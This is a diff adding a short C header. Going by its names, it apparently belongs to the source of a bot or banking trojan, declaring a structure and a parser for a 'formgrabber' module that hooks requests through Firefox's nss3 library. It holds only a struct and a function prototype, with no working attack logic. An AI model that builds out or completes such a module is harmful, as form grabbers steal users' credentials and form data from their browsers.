@@ -1,0 +1,13 @@
+#pragma once
+#include "modules.h"
+
+#ifdef MODULE_FORMGRABBER
+#include "..\common\bot_structs.h"
+
+typedef struct  
+{
+	LPSTR url;
+}nss3_request_t;
+
+BOOL ParseNss3RequestFromBuffer(nss3_request_t* pRequest, const LPSTR pszBuffer);
+#endif
